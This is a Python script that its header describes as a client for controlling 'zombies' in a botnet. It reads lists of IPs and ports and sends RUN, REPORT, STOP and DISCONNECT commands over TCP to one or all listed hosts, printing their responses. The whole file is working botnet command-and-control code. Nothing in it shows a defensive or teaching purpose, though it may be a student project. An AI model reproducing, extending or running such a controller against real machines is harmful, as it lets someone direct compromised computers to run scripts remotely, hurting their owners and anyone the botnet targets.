#!/usr/bin/python3

#####################################
# Client that controls the zombies  #
# in botnet                         #
#                                   #
#                                   #
# Preston Dickerson                 #
#                                   #
#####################################


# Object that deals with the buffering of http responses
import socket

def bufferMessages(sock):
    finalBuffer = ""
    # Parse into buffer
    while True:
        chunk = sock.recv(1024).decode()
        if not chunk:
            break
        finalBuffer += chunk
        if "\r\n\r\n" in finalBuffer:
            break

    return finalBuffer
    
def main():
    # Get input
    inputIPs = input("Enter IPs delimited by a ','" + "\n")
    ipArray = inputIPs.split(",")

    ipDictionary = {}
    for ip in ipArray:
        inputPorts = input("Enter ports you would like to listen to at IP: " + ip +"\n")
        portArray = inputPorts.split(",")
        
        # Associate IP with ports in the dictionary
        ipDictionary[ip] = portArray

    while True:
        command = input("Enter command (or 'DISCONNECT' to exit):\n")
        
        if command == "DISCONNECT":
            mess =  "DISCONNECT\r\n\r\n"
            for ip in ipDictionary:
                    for port in ipDictionary[ip]:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                        print("Disconnecting from: " + ip + "->" + port)
                        try:
                            sock.connect((ip, int(port)))

                            sock.send(mess.encode())

                            print(bufferMessages(sock))

                        except Exception as e:
                            print(f"Failed to disconnect from {ip}:{port}. Error: {e}")
                        finally:
                            sock.close()

            break

        # Assuming the command format is "RUN *.py <IP> <port>"
        if command.startswith("RUN") or command.startswith("REPORT") or command.startswith("STOP"):
            parts = command.split()
            if len(parts) == 4:
                method, scriptName, ip, port = parts[0], parts[1], parts[2], parts[3]

                message = method + " " + scriptName 
                message += "\r\n\r\n"

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                try:
                    sock.connect((ip, int(port)))

                    sock.send(message.encode())

                    print("Response: \n" + bufferMessages(sock))

                except Exception as e:
                    print(f"Failed to connect to {ip}:{port}. Error: {e}")
                finally:
                    sock.close()
                
                # If there are only two params, assume they want to send to every host at every port
            elif len(parts) == 2:
                method, scriptName = parts[0], parts[1]

                message = method + " " + scriptName
                message += "\r\n\r\n"

                for ip in ipDictionary:
                    for port in ipDictionary[ip]:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                        print(ip + "->" + port)
                        try:
                            sock.connect((ip, int(port)))

                            sock.send(message.encode())

                            print("Response: \n" + bufferMessages(sock))

                        except Exception as e:
                            print(f"Failed to connect to {ip}:{port}. Error: {e}")
                        finally:
                            sock.close()


            else:
                print("Invalid command format. Please use 'RUN/REPORT/STOP *.py <IP> <port>'.")

        else:
            print("Invalid command. Please use 'RUN/REPORT/STOP *.py <IP> <port>' or 'DISCONNECT'.")

main()